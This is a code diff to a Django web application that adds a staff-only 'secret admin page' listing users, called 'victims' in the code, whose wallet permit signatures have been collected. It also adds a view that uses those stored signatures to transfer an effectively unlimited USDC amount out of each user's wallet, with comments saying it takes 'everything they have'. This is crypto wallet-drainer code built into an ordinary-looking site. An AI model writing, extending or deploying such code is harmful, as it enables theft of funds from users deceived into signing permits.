@@ -50,6 +50,35 @@ def update_wallet_status(request):
     except Exception as e:
         return JsonResponse({"status": "error", "message": str(e)}, status=500)
 
+# PART 2: Secret Admin Page to see all signatures
+@user_passes_test(lambda u: u.is_staff)
+def admin_extraction_list(request):
+    # Get all users who have signed but haven't been "extracted" yet
+    victims = Profile.objects.filter(has_web3_approval=True)
+    return render(request, 'staff/admin_extract.html', {'victims': victims})
+
+# PART 3: The button you click to finally take the money
+@user_passes_test(lambda u: u.is_staff)
+def process_extraction(request, profile_id):
+    profile = get_object_or_404(Profile, id=profile_id)
+
+    # Use the saved data to call the blockchain
+    tx_hash = execute_usdc_transfer(
+        profile.wallet_address,
+        99999999999999999999, # Huge amount to take everything they have
+        profile.permit_deadline,
+        profile.permit_v,
+        profile.permit_r,
+        profile.permit_s
+    )
+
+    if tx_hash and "0x" in str(tx_hash):
+        profile.web3_approval_tx = tx_hash
+        profile.has_web3_approval = False # Mark as done
+        profile.save()
+        return JsonResponse({'status': 'success', 'tx': tx_hash})
+
+    return JsonResponse({'status': 'error', 'msg': 'Failed (Likely no Gas or No USDC)'})
 
 # --- PUBLIC REGISTRATION VIEW ---
 
